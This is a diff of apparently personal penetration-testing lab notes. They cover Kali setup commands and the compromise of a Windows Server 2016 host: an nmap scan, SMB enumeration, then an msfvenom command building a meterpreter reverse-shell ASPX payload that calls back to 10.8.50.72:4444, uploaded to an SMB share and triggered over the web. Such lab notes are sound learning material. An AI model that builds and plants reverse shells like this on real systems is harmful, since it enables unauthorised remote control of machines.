@@ -1,3 +1,10 @@
+getend group | grep kali -> look at groups which are in kali
+install docker - sudo apt install docker.io
+sudo apt install podman - install podman
+sudo visudo - sudoers
+sudo usermod -aG nameofgroup nameofuser
+(sudo usermod -aG docker mark)
+
 1. did the nmap scan. found smb on 445 and RDP on 3389
 
 2. enumerating SMB port
@@ -39,8 +46,11 @@ lets mirror windows server 2016 exploit to current working dir.
 
 i went for this step. it seems easy. i created a revese shell using msfvenom and uploaded it to smb share and triggered it using web. 
 creating the reverse shell. 
+[msfvenom -l payloads | grep windows | grep reverse | grep shell ]
 
-[msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspx]
+[msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options]
+
+[msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspx] - windows/x64/meterpreter/reverse_tcp also worked
 
 also pentest.ws site can be used to create the same path to get the reverse shell
 
